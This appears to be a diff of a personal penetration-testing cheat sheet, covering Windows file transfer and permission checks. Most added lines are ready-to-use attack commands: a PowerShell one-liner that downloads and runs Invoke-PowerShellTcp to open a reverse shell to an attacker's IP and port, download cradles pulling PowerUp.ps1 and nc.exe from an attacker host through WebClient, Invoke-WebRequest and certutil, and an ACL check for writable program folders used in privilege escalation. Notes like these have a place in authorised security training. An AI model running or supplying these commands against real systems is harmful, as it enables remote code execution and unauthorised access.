@@ -260,13 +260,21 @@
 
 - findstr = grep
 - Windows: get file 
+  - powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+  
   - powershell -c Invoke-Webrequest -OutFile winPeas.bat http://**IP_ATTACKER/FIlE**
-  - powershell -c "(new-object System.Net.WebClient).Downloadfile('https://1**IP_ATTACKER/FIlE**, 'C:\Users\fela.CORP\Downloads\PowerUp.ps1')" = Load the script
+  
+  - powershell -c "(new-object System.Net.WebClient).Downloadfile('https://1**IP_ATTACKER/FIlE**', 'C:\Users\fela.CORP\Downloads\PowerUp.ps1')" = Load the script
+  
   - iex(New-Object Net.WebClient).DownloadString("http://10.9.1.255:80/PowerUp.ps1")dir
-  - powershell -c wget "h**IP_ATTACKER/FIlE** -outfile "PowerUp.ps1"
-  - **certutil** -urlcache -f http://10.9.1.255:80/nc.exe nc.exe
 
-- check permision
+  - powershell -c wget "h**IP_ATTACKER/FIlE** -outfile "PowerUp.ps1"
+
+  - **certutil** -urlcache -f http://10.9.1.255:80/nc.exe nc.exe
+  
+  - copy (New-Object System.Net.WebClient).Downloadfile('http://ATTACKING_MACHINE:PORT/FILE','C:\path\to\target\FILE')
+
+- **Check permisions**
   - powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list" ==> if fullcontroll = vuln
 
 - powershell.exe
